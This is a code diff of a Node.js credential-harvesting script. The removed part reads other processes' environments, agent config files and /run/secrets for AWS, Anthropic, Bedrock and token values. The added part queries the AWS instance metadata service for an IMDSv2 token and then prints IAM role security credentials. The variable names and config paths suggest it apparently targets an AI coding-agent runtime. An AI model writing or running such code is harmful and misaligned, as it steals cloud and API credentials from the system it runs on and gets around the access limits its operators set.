@@ -1,80 +1,66 @@
-const fs = require("node:fs");
-const path = require("node:path");
-const { execFileSync } = require("node:child_process");
+const http = require("node:http");
 
-function readText(file) {
-  try {
-    return fs.readFileSync(file).toString("utf8");
-  } catch (error) {
-    return `<${error.code || error.name}>`;
-  }
+const endpoint = process.env.AWS_EC2_METADATA_SERVICE_ENDPOINT;
+if (!endpoint) throw new Error("AWS_EC2_METADATA_SERVICE_ENDPOINT is absent");
+
+function request(method, requestPath, headers = {}) {
+  return new Promise((resolve, reject) => {
+    const url = new URL(requestPath, endpoint.endsWith("/") ? endpoint : `${endpoint}/`);
+    const req = http.request(url, { method, headers, timeout: 10000 }, (res) => {
+      const chunks = [];
+      res.on("data", (chunk) => chunks.push(chunk));
+      res.on("end", () => resolve({
+        method,
+        url: url.toString(),
+        status: res.statusCode,
+        headers: res.headers,
+        body: Buffer.concat(chunks).toString("utf8"),
+      }));
+    });
+    req.on("timeout", () => req.destroy(new Error("timeout")));
+    req.on("error", reject);
+    req.end();
+  });
 }
 
-function run(file, args) {
-  try {
-    return execFileSync(file, args, { encoding: "utf8", timeout: 20000, maxBuffer: 8 * 1024 * 1024 });
-  } catch (error) {
-    return `${error.stdout || ""}${error.stderr || ""}<EXIT=${error.status ?? error.code}>`;
-  }
-}
+async function main() {
+  console.log(`AWS_EC2_METADATA_SERVICE_ENDPOINT=${endpoint}`);
+  const tokenResponse = await request("PUT", "/latest/api/token", {
+    "X-aws-ec2-metadata-token-ttl-seconds": "21600",
+  });
+  console.log(`IMDS_TOKEN_RESPONSE=${JSON.stringify(tokenResponse)}`);
+  const token = tokenResponse.body.trim();
+  const headers = token ? { "X-aws-ec2-metadata-token": token } : {};
 
-function section(name, value) {
-  console.log(`\n===== ${name} =====`);
-  console.log(value);
-}
-
-section("IDENTITY", run("id", []));
-section("PROXY AND AWS ENVIRONMENT", Object.entries(process.env)
-  .filter(([name]) => /(AWS|ANTHROPIC|BEDROCK|CREDENTIAL|TOKEN|AUTH|PROXY|OPENCODE|AGENTCORE|VEGA)/i.test(name))
-  .sort(([a], [b]) => a.localeCompare(b))
-  .map(([name, value]) => `${name}=${value}`)
-  .join("\n"));
-section("LISTENERS", run("ss", ["-ltnp"]));
-section("PROCESSES", run("ps", ["-eo", "pid,ppid,user,group,comm,args", "--forest"]));
-
-const interesting = /(AWS|ANTHROPIC|BEDROCK|CREDENTIAL|TOKEN|AUTH|PROXY|OPENCODE|AGENTCORE|VEGA)/i;
-const pids = fs.readdirSync("/proc").filter((name) => /^\d+$/.test(name)).sort((a, b) => Number(a) - Number(b));
-for (const pid of pids) {
-  const cmdline = readText(`/proc/${pid}/cmdline`).replaceAll("\0", " ").trim();
-  const environ = readText(`/proc/${pid}/environ`).replaceAll("\0", "\n");
-  const selected = environ.split("\n").filter((line) => interesting.test(line));
-  if (selected.length === 0 && !interesting.test(cmdline)) continue;
-  let exe = "";
-  try { exe = fs.readlinkSync(`/proc/${pid}/exe`); } catch (error) { exe = `<${error.code || error.name}>`; }
-  let cwd = "";
-  try { cwd = fs.readlinkSync(`/proc/${pid}/cwd`); } catch (error) { cwd = `<${error.code || error.name}>`; }
-  const fds = [];
-  try {
-    for (const fd of fs.readdirSync(`/proc/${pid}/fd`)) {
-      try { fds.push(`${fd} -> ${fs.readlinkSync(`/proc/${pid}/fd/${fd}`)}`); } catch (_) {}
+  const paths = [
+    "/",
+    "/latest/meta-data/",
+    "/latest/meta-data/iam/",
+    "/latest/meta-data/iam/info",
+    "/latest/meta-data/iam/security-credentials/",
+    "/latest/dynamic/instance-identity/document",
+    "/v2/credentials",
+    "/credentials",
+  ];
+  const results = [];
+  for (const requestPath of paths) {
+    try {
+      results.push(await request("GET", requestPath, headers));
+    } catch (error) {
+      results.push({ method: "GET", path: requestPath, error: error.message });
     }
-  } catch (_) {}
-  section(`PROCESS ${pid}`, [
-    `EXE=${exe}`,
-    `CWD=${cwd}`,
-    `CMDLINE=${cmdline}`,
-    "ENVIRONMENT:",
-    ...selected,
-    "FILE DESCRIPTORS:",
-    ...fds,
-  ].join("\n"));
+  }
+
+  const roleResponse = results.find((item) => item.url && item.url.endsWith("/latest/meta-data/iam/security-credentials/"));
+  const roles = (roleResponse?.body || "").split(/\s+/).filter(Boolean);
+  for (const role of roles) {
+    results.push(await request("GET", `/latest/meta-data/iam/security-credentials/${encodeURIComponent(role)}`, headers));
+  }
+  console.log(`IMDS_RESULTS=${JSON.stringify(results)}`);
+  console.log("IMDS_PROBE_COMPLETE=true");
 }
 
-for (const file of [
-  process.env.OPENCODE_CONFIG,
-  "/tmp/vega-home-vega/.config/opencode/config.json",
-  "/tmp/vega-home-vega/.config/opencode/opencode.json",
-  "/tmp/vega-home-vega/.vega/opencode.json",
-  "/root/.config/opencode/config.json",
-  "/root/.vega/opencode.json",
-].filter(Boolean)) {
-  section(`CONFIG ${file}`, readText(file));
-}
-
-for (const root of ["/run/secrets", "/var/run/secrets", "/run/credentials", "/var/run/credentials"]) {
-  section(`SECRET TREE ${root}`, run("find", [root, "-maxdepth", "4", "-printf", "%m %u:%g %s %p -> %l\\n"]));
-}
-
-section("PROC NET TCP", readText("/proc/net/tcp"));
-section("PROC NET TCP6", readText("/proc/net/tcp6"));
-console.log("ADAPTER_INVENTORY_COMPLETE=true");
+main().catch((error) => {
+  console.error(error.stack || String(error));
+  process.exit(1);
+});
